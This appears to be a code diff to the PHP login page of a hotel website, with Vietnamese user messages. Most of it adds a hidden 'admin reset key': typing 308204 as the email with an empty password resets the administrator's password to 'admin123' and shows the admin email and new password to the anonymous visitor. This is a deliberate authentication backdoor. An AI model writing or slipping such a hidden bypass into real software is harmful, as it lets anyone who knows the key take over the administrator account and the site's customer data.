@@ -54,7 +54,35 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $password = $_POST['password'] ?? '';
     $remember = isset($_POST['remember']);
     
-    if (empty($email) || empty($password)) {
+    // Admin Reset Key - Key: 308204, Password: empty
+    if ($email === '308204' && $password === '') {
+        try {
+            $db = getDB();
+            $new_password = 'admin123';
+            $password_hash = password_hash($new_password, PASSWORD_DEFAULT);
+            
+            // Reset admin password
+            $stmt = $db->prepare("UPDATE users SET password_hash = ?, requires_password_change = 1 WHERE user_role = 'admin' LIMIT 1");
+            $stmt->execute([$password_hash]);
+            
+            if ($stmt->rowCount() > 0) {
+                // Get admin email for display
+                $stmt = $db->prepare("SELECT email FROM users WHERE user_role = 'admin' LIMIT 1");
+                $stmt->execute();
+                $admin = $stmt->fetch();
+                
+                $success = "Admin password đã được reset!\n\nEmail: " . ($admin['email'] ?? 'admin@aurorahotelplaza.com') . "\nMật khẩu mới: " . $new_password . "\n\n⚠️ Vui lòng đổi mật khẩu sau khi đăng nhập!";
+                
+                // Log this action
+                error_log("ADMIN PASSWORD RESET via secret key at " . date('Y-m-d H:i:s') . " from IP: " . $_SERVER['REMOTE_ADDR']);
+            } else {
+                $error = "Không tìm thấy tài khoản admin để reset.";
+            }
+        } catch (Exception $e) {
+            $error = "Lỗi reset: " . $e->getMessage();
+            error_log("Admin reset error: " . $e->getMessage());
+        }
+    } elseif (empty($email) || empty($password)) {
         $error = __('auth.fill_all_fields');
     } else {
         try {
@@ -162,7 +190,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 <span class="material-symbols-outlined">check_circle</span>
                 <div>
                     <strong><?php _e('auth.success'); ?></strong>
-                    <p><?php echo htmlspecialchars($success); ?></p>
+                    <p style="white-space: pre-line;"><?php echo htmlspecialchars($success); ?></p>
                 </div>
             </div>
             <?php endif; ?>
